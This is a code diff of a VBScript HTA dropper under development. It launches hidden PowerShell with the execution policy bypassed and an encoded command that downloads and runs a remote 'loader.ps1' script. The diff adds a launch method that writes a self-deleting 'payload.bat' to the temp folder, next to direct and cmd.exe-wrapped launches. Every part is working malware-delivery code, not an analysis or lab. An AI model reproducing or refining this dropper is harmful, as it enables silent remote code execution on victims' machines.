@@ -22,11 +22,9 @@
         
         debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
         psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
+        encodedCmd = "<base-64 string>"
         
-        ' Your base64 encoded command
-        encodedCmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
-        
-        ' Test 1: Decode the base64 command to see what it contains
+        ' Test decode command - DON'T WAIT (False instead of True)
         Dim decodeCmd
         decodeCmd = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & encodedCmd & "')) | Out-File -FilePath '" & debugPath & "' -Append"""
         
@@ -36,10 +34,11 @@
         debugFile.WriteLine "Decode command: " & decodeCmd
         debugFile.Close
         
-        sh.Run decodeCmd, 0, True
+        ' Use False instead of True - HTA cannot wait for processes
+        sh.Run decodeCmd, 0, False
         
-        ' Test 2: Try different execution methods
-        setTimeout "TestExecution", 2000
+        ' Delay before next step since we can't wait
+        setTimeout "TestExecution", 3000
     End Sub
     
     Sub TestExecution()
@@ -49,42 +48,30 @@
         
         debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
         psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
-        encodedCmd = "<base-64 string>"
+        encodedCmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
         
-        Dim debugFile
-        Set debugFile = fso.OpenTextFile(debugPath, 8, True)
-        debugFile.WriteLine "=== EXECUTION TESTS ==="
-        debugFile.Close
-        
-        ' Method 1: Direct execution (what you're currently doing)
+        ' Method 1: Direct execution
         Dim cmd1
         cmd1 = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd
-        debugFile.WriteLine "Method 1: " & cmd1
-        debugFile.Close
         sh.Run cmd1, 0, False
         
-        ' Method 2: Use cmd.exe wrapper
+        ' Method 2: Use cmd.exe wrapper (most reliable for HTA)
         Dim cmd2
         cmd2 = "cmd.exe /c """ & Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd & """"
-        Set debugFile = fso.OpenTextFile(debugPath, 8, True)
-        debugFile.WriteLine "Method 2: " & cmd2
-        debugFile.Close
         sh.Run cmd2, 0, False
         
-        ' Method 3: Write to temp file and execute
-        Dim tempPsPath
-        tempPsPath = sh.ExpandEnvironmentStrings("%TEMP%\payload.ps1")
-        Dim decodeAndSave
-        decodeAndSave = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & encodedCmd & "')) | Out-File -FilePath '" & tempPsPath & "' -Encoding UTF8"""
-        sh.Run decodeAndSave, 0, True
+        ' Method 3: Alternative approach - write batch file
+        Dim batPath, batContent
+        batPath = sh.ExpandEnvironmentStrings("%TEMP%\payload.bat")
+        batContent = "@echo off" & vbCrLf & _
+                    Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd & vbCrLf & _
+                    "del """ & batPath & """"
         
-        ' Execute the decoded script
-        Dim cmd3
-        cmd3 = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & tempPsPath & """"
-        Set debugFile = fso.OpenTextFile(debugPath, 8, True)
-        debugFile.WriteLine "Method 3: " & cmd3
-        debugFile.Close
-        sh.Run cmd3, 0, False
+        Set batFile = fso.CreateTextFile(batPath, True)
+        batFile.Write batContent
+        batFile.Close
+        
+        sh.Run Chr(34) & batPath & Chr(34), 0, False
         
         setTimeout "CleanupAndExit", 5000
     End Sub
